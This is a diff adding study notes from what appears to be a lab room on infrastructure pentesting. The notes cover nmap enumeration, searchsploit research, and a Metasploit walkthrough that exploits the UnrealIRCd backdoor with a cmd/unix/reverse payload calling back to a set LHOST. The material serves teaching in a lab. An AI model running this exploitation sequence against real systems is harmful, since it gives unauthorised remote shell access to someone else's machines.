@@ -1,0 +1,89 @@
+Infrastructure penetration tests (colloquially referred to as infra pentests) are security assessments of devices on a network. These can be servers, printers, firewalls, or any other device with a network interface that can be accessed over the Internet or a LAN.
+    In a later room, Formal Penetration Testing Frameworks, we'll visit frameworks, but for now, keep this simple methodology in the back of your mind, as it's the backbone of everything you'll do here. 
+        - Enumeration: Start from zero. What do you know, and what do you need to find out?
+        - Vulnerability analysis: Analyze your enumeration results and connect the dots to potential weaknesses.
+        - Initial access: Pick your attack and execute it; get a foothold on the target.
+        - Privilege escalation: You're in, but it's not over. Enumerate again, this time from the inside, and find a way up.
+        - Reporting: None of the above matters if you can't communicate it. This is the actual deliverable. In this room, we will only cover this conceptually,
+            as this topic will be covered in more detail in the Writing Pentest Reports room later in this path.
+
+    Learning Objectives
+        se tools and techniques to scan a Linux host
+        Research vulnerable software to find a working exploit
+        Enumerate local Linux files to escalate privileges
+
+Enumerate
+    Why Enumerate?
+        Before you touch a single exploit or try a single password, you need to understand what you're looking at. Enumeration is the foundation of every penetration test and, without it, you're just guessing.
+            The goal here is simple: learn as much as you can about the target before making any moves. What ports are open? What services are running? What versions are behind them? Every piece of information you gather now shapes the decisions you'll make later.
+            Rushed enumeration leads to missed opportunities, and in a real engagement, that could mean the difference between a finding and a footnote in your report.
+
+    Scanning With Nmap
+        nmap -sV -sC -oN scan.txt 10.113.151.208
+        As a reminder:
+            -sV probes open ports to identify the service and version running behind them.
+            -sC runs Nmap's default set of scripts, which pull extra details like banners, supported authentication methods, and more.
+            -oN scan.txt saves the output to a file. Get in this habit early, and you'll thank yourself during reporting.
+    
+    Vulnerability Analysis
+        Connect the Dots
+            Don't look at the output like a wall of text. Start asking questions. Is that service version outdated? Is there a known exploit for it? Is something misconfigured? Vulnerability analysis is really just the process of taking what enumeration gave you and asking, "What can go wrong here?".
+
+            Your Nmap output gave you two open ports. The simplest method here is to Google their versions and the keyword "exploit".
+            For example, Googling "OpenSSH 9.6p1 exploit" might yield results on theoretical or very distribution-specific exploits, but nothing tangible. So it is most likely a dead end.
+
+            If you are comfortable with the Kali packages, instead of googling, you can use the searchsploit utility to find exploits. Searchsploit is a command-line tool that lets you search Exploit-DB's offline database of public exploits and vulnerability disclosures directly from your terminal.
+                searchsploit openssh
+
+                if nothing of real interest, as the versions differ from our reported version. However, searching with either method for the other result from your nmap scan will quickly yield results.
+    
+    Gaining a Foothold
+        By now you should have found an exploit for UnrealIRCd that abuses a backdoor left in the software. If you didn't find it, don't worry, it's a learning curve
+        The good part about the exploit we are going to use is that there's a Metasploit module for it. This makes exploitation much easier than modifying exploit scripts. Let's fire up Metasploit first.
+            
+            msfconsole
+
+        Then, search for the module we need.
+
+            search unrealircd
+
+        From the list, we can use the suggested exploit against our target
+            
+            use 0
+
+        First, we need to see what we must configure for this exploit to run
+
+            show options
+
+        As we can see, the only required parameter that is not yet set is RHOSTS (marked by the Required column), so we can set it to the lab machine's IP address.
+
+            set RHOSTS 10.113.151.208
+
+        We still need a payload for this exploit to run. We can list available payloads with 
+
+            show payloads
+
+         Since we don't know much about our target or what software it has installed, the safest course is to use a Unix reverse generic payload.
+
+            set payload cmd/unix/reverse
+
+        Now, if we run show options again, we'll see that LHOST and LPORT are required for this payload.
+
+            set LHOST 10.113.84.187
+            set LPORT 443
+
+        Now that everything is set, we can launch our attack against the lab machine using the exploit command.
+
+        Once the exploit completes, you can read the flag from /home/webmaster/flag.txt.
+
+        Note :
+            When you first catch a reverse shell, it's typically a "dumb" shell without full terminal features — it lacks job control, tab completion, and importantly, commands like su or sudo won't work because they require an interactive TTY to securely read passwords. 
+                Upgrading to a full TTY transforms your basic reverse shell into a proper interactive terminal session, which is necessary because commands like su and sudo require a real terminal (TTY) to safely prompt for and read password input. In this room, this is not required, as we will see later.
+
+        
+
+        
+        
+            
+
+
